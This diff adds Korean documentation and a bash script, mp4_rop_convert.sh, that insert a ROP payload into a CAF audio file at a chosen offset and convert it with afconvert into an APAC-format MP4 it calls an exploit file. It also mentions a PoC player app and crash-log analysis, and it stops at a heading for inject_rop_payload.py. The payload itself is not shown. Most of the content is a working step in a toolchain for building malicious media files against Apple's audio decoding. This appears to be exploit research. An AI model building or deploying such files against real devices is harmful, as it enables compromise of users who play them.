@@ -1,4 +1,63 @@
 
+# APAC ROP Payload 자동 변환 스크립트
+
+## 스크립트: `mp4_rop_convert.sh`
+
+### 기능
+1. 지정한 `.caf` 파일에 ROP 페이로드 자동 삽입
+2. `afconvert`를 사용해 APAC 형식의 `.mp4`로 변환
+
+### 사용법
+
+```bash
+chmod +x mp4_rop_convert.sh
+./mp4_rop_convert.sh <input.caf> [offset_hex]
+```
+- `<input.caf>`: 기존 `.caf` 파일 (e.g., `output.caf`)
+- `[offset_hex]`: 페이로드 삽입 위치 (기본값 `0x100`)
+
+### 예시
+
+```bash
+./mp4_rop_convert.sh output.caf 0x200
+# patched.caf 생성
+# output_rop.mp4 생성
+```
+
+### 결과
+- `patched.caf`: ROP 페이로드가 삽입된 CAF 파일
+- `output_rop.mp4`: APAC 포맷의 MP4 파일 (Exploit 파일)
+
+### 이후 실험
+- 이 `output_rop.mp4`를 PoC 앱(`APACExploitPlayer.swift`)에 포함시켜 재생
+- LLDB 또는 Crash 로그 도구(`extract_crash_logs.sh`)로 충돌 분석
+
+
+
+
+#!/bin/bash
+# File: mp4_rop_convert.sh
+# Description: Automate ROP payload injection and conversion to APAC MP4
+
+# Usage: ./mp4_rop_convert.sh input.caf offset_hex
+# Example: ./mp4_rop_convert.sh output.caf 0x200
+
+INPUT_CAF="$1"
+OFFSET="${2:-0x100}"
+PATCHED_CAF="patched.caf"
+OUTPUT_MP4="output_rop.mp4"
+
+echo "[*] Injecting ROP payload at offset $OFFSET"
+python inject_rop_payload.py "$INPUT_CAF" "$PATCHED_CAF" "$OFFSET"
+
+echo "[*] Converting patched CAF to APAC MP4"
+afconvert -o "$OUTPUT_MP4" -d apac -f mp4f "$PATCHED_CAF"
+
+echo "[+] Generated $OUTPUT_MP4"
+
+
+
+
 # 🎯 APAC ROP Payload 자동 삽입 도구
 
 ## 📦 파일: `inject_rop_payload.py`
